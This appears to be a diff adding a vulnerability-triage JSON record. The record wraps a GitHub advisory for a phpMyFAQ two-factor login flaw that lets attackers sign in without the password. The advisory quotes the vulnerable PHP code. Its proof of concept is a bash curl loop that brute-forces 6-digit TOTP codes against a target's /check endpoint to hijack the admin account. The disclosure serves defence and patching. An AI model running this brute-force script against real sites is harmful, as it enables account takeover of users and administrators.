@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/267591709?v=4\", \"events_url\": \"https://api.github.com/users/waseem-cve/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/waseem-cve/followers\", \"following_url\": \"https://api.github.com/users/waseem-cve/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/waseem-cve/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/waseem-cve\", \"id\": 267591709, \"login\": \"waseem-cve\", \"node_id\": \"U_kgDOD_MgHQ\", \"organizations_url\": \"https://api.github.com/users/waseem-cve/orgs\", \"received_events_url\": \"https://api.github.com/users/waseem-cve/received_events\", \"repos_url\": \"https://api.github.com/users/waseem-cve/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/waseem-cve/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/waseem-cve/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/waseem-cve\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-56737\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}], \"description\": \"### Summary\\nThe public two-factor verification endpoint `POST /check` logs a user in based **solely** on a valid\\n6-digit TOTP token and a chosen `user-id`. It does **not** require — and is not bound to — a prior\\nsuccessful password authentication. For any account that has 2FA enabled, an unauthenticated attacker\\ncan authenticate **without knowing the password**, reducing the account to a single factor (a 6-digit\\ncode) that is itself brute-forceable because this endpoint has no lockout (see Finding #2). This is an\\nauthentication bypass of the primary credential for all 2FA-protected accounts, including administrators.\\n\\n### Details\\n`src/phpMyFAQ/Controller/Frontend/AuthenticationController.php:255-283`:\\n\\n```php\\n#[Route(path: '/check', name: 'public.auth.check', methods: ['POST'])]\\npublic function check(Request $request): RedirectResponse\\n{\\n    if ($this->currentUser->isLoggedIn()) {\\n        return new RedirectResponse(url: './');\\n    }\\n\\n    $token  = Filter::filterVar($request->request->get('token'), FILTER_SANITIZE_SPECIAL_CHARS);\\n    $userId = (int) Filter::filterVar($request->request->get('user-id'), FILTER_VALIDATE_INT);\\n\\n    if ($userId <= 0) { /* ... */ }\\n\\n    $this->currentUserService->getUserById($userId);          // loads attacker-chosen user\\n\\n    if (strlen((string) $token) === 6) {\\n        $result = $this->twoFactor->validateToken($token, $userId);\\n        if ($result) {\\n            $this->currentUserService->twoFactorSuccess();    // full login, no password ever checked\\n            return new RedirectResponse(url: './');\\n        }\\n    }\\n    // ...\\n}\\n```\\n\\n`twoFactorSuccess()` performs a complete session login (`src/phpMyFAQ/User/CurrentUser.php:239-247`):\\n\\n```php\\npublic function twoFactorSuccess(): bool\\n{\\n    $this->setLoggedIn(true);\\n    $this->updateSessionId(true);\\n    $this->saveToSession();\\n    $this->setSuccess(true);\\n    return true;\\n}\\n```\\n\\nThere is **no server-side state** (such as a \\\"password already verified for this user\\\" flag) tying the\\n`/check` step to the password step. Compare the admin flow, which does it correctly via a\\n`2fa_pending_user_id` session value set only **after** the password is validated\\n(`src/phpMyFAQ/Controller/Administration/AuthenticationController.php:218-262`) — proving the frontend\\nomission is a regression, not an intended design.\\n\\n`validateToken()` (`src/phpMyFAQ/User/TwoFactor.php:87-101`) returns `false` when the user has no secret,\\nso this is *not* a universal bypass of all accounts — it specifically defeats the **password factor of\\nevery 2FA-enabled account**:\\n\\n```php\\npublic function validateToken(string $token, int $userId): bool\\n{\\n    if (strlen($token) !== 6 || $userId <= 0) { return false; }\\n    $this->currentUser->getUserById($userId);\\n    $secret = $this->currentUser->getUserData('secret');\\n    if (!is_string($secret) || $secret === '') { return false; }   // no 2FA -> false\\n    return $this->twoFactorAuth->verifyCode($secret, $token);       // 6-digit TOTP only\\n}\\n```\\n\\nBecause `/check` has no failed-attempt lockout and the per-account login throttle is disabled by default\\n(Finding #2), the 6-digit code can be brute-forced across TOTP windows. The net effect: 2FA, intended to\\n*strengthen* the password, becomes the *only* barrier and is independently guessable.\\n\\n### PoC\\nPre-req: a target account (e.g. `admin`) has 2FA enabled (a common hardening choice). The attacker knows\\nor enumerates the numeric `user-id` (1 = first/admin account in default installs).\\n\\n```bash\\n# No password required. Submit user-id + a 6-digit TOTP guess to /check.\\n# Iterate the token space; the session cookie returned on success is an authenticated session.\\nfor code in $(seq -w 0 999999); do\\n  curl -ks -c jar.txt -b jar.txt \\\\\\n    -X POST \\\"https://target/check\\\" \\\\\\n    --data-urlencode \\\"user-id=1\\\" \\\\\\n    --data-urlencode \\\"token=$(printf '%06d' 10#$code)\\\" \\\\\\n    -o /dev/null -w \\\"%{http_code} %{redirect_url}\\\\n\\\" \\\\\\n  | grep -q './'   && echo \\\"[+] logged in with token $code\\\" && break\\ndone\\n# A successful guess yields a logged-in session in jar.txt -> full account takeover (no password used).\\n```\\nIf the attacker already controls or has phished the victim's TOTP device, a single request authenticates\\nwith no password at all.\\n\\n### Impact\\nAuthentication bypass (CWE-287) / missing authentication for a critical step (CWE-306). The password —\\nthe primary credential — is never required for any 2FA-enabled account. Combined with the absent lockout,\\nthis enables full account takeover of users and administrators. Impacted: any deployment where users\\nenable two-factor authentication.\", \"ghsa_id\": \"GHSA-8gpw-xvpf-hvx5\", \"github_reviewed_at\": \"2026-09-24T19:29:27Z\", \"html_url\": \"https://github.com/advisories/GHSA-8gpw-xvpf-hvx5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8gpw-xvpf-hvx5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-56737\"}], \"nvd_published_at\": \"2026-09-24T16:17:07Z\", \"published_at\": \"2026-09-24T19:29:27Z\", \"references\": [\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-8gpw-xvpf-hvx5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-56737\", \"https://github.com/thorsten/phpMyFAQ/commit/410208b90f1d01534812ac5203d3e8d9c7bd591f\", \"https://github.com/thorsten/phpMyFAQ/commit/5097dff341fb01e93e8561e7261b3ae657df715a\", \"https://github.com/thorsten/phpMyFAQ/commit/6a69f6e2142fde722165c65b7e0a49f3176e87be\", \"https://github.com/thorsten/phpMyFAQ/releases/tag/4.1.6\", \"https://github.com/advisories/GHSA-8gpw-xvpf-hvx5\"], \"repository_advisory_url\": \"https://api.github.com/repos/thorsten/phpMyFAQ/security-advisories/GHSA-8gpw-xvpf-hvx5\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/thorsten/phpMyFAQ\", \"summary\": \"phpMyFAQ's two-factor authentication login bypasses the password factor\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-24T19:29:30Z\", \"url\": \"https://api.github.com/advisories/GHSA-8gpw-xvpf-hvx5\", \"vulnerabilities\": [{\"first_patched_version\": \"4.1.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"thorsten/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.2.0, < 4.1.6\"}, {\"first_patched_version\": \"4.1.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"phpmyfaq/phpmyfaq\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.2.0, < 4.1.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8gpw-xvpf-hvx5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "phpmyfaq/phpmyfaq: >= 3.2.0, < 4.1.6",
+      "thorsten/phpmyfaq: >= 3.2.0, < 4.1.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-56737"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "phpmyfaq/phpmyfaq",
+      "thorsten/phpmyfaq"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-25T19:13:21.163136Z",
+  "provenance": {
+    "content_sha256": "435c48eee963b06190e757a7eb2bc8d8e0b254d5e8ce4c9390fd455edcfbe019",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-24T19:29:27Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8gpw-xvpf-hvx5",
+  "status": "active",
+  "title": "phpMyFAQ's two-factor authentication login bypasses the password factor",
+  "updated_at": "2026-09-24T19:29:30Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8gpw-xvpf-hvx5"
+}
